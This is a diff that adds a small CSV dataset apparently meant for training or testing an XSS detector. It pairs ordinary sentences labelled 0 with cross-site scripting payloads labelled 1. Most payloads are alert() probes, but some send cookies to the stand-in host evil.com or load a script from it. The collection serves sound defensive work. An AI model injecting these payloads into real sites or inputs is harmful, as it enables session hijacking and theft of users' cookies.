@@ -1,0 +1,61 @@
+text,label
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
+Could you please share the updated pricing sheet?,0
+The train departs at 6:45 AM from platform 2.,0
+<body onload=alert('XSS')>,1
+The weather in Ghaziabad is really nice today.,0
+<details open ontoggle=alert(1)>,1
+Price range: $10 - $50 depending on size.,0
+"5 < 10 and 10 > 5, basic math check.",0
+<textarea onfocus=alert(1) autofocus>,1
+Can we reschedule our call to 4 PM tomorrow?,0
+<svg/onload=alert('XSS')>,1
+<svg onload=alert(1)>,1
+I'd like to cancel my subscription starting next month.,0
+Can you send me the invoice for last month?,0
+This is a test comment for the blog post.,0
+<ScRiPt>alert(1)</sCrIpT>,1
+<select onfocus=alert(1) autofocus>,1
+<script src=http://evil.com/x.js></script>,1
+<img src=x onerror=alert(1)>,1
+Looking forward to the meeting on Thursday.,0
+What time does the store close today?,0
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+<input onfocus=alert(1) autofocus>,1
+"Thanks, that resolved my issue completely.",0
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+My name is Rahul and I'm reaching out about the internship.,0
+"Congratulations on your promotion, well deserved!",0
+<script>fetch('http://evil.com/?c='+document.cookie)</script>,1
+I scored 85 marks in my last exam.,0
+Please update my shipping address to the new flat.,0
+"My order number is 48213, it hasn't arrived yet.",0
+<img src=x onerror=alert('XSS')>,1
+"<div onmouseover=""alert('XSS')"">hover me</div>",1
+javascript:alert(1),1
+Is there a discount available for students?,0
+&#60;script&#62;alert(1)&#60;/script&#62;,1
+"I love this product, will buy again.",0
+Please find below my feedback on the new UI design.,0
+<marquee onstart=alert(1)>,1
+<img src=x:alert(alt) onerror=eval(src) alt=xss>,1
+Let's meet at the library at 3 PM to study.,0
+javascript:alert('XSS'),1
+<style>@import 'javascript:alert(1)';</style>,1
+"<img src=""x"" onerror=""alert(document.cookie)"">",1
+<script>alert('XSS')</script>,1
+<iframe src=javascript:alert(1)>,1
+Email me at test@example.com for more details.,0
+"The recipe turned out great, thanks for posting it.",0
+Happy birthday! Hope you have a wonderful day.,0
+"""><script>alert(1)</script>",1
+<script>alert(1)</script>,1
+The login page keeps showing a blank screen for me.,0
+<a href=javascript:alert('XSS')>click</a>,1
+"The report is attached, let me know if changes are needed.",0
+<video><source onerror=alert(1)>,1
+Use the & symbol to join two conditions in the query.,0
+"Great article, thanks for sharing!",0
+"Excellent customer service, resolved in minutes.",0
+The <b>bold</b> tag makes text stand out in HTML.,0
+"';alert(String.fromCharCode(88,83,83))//",1
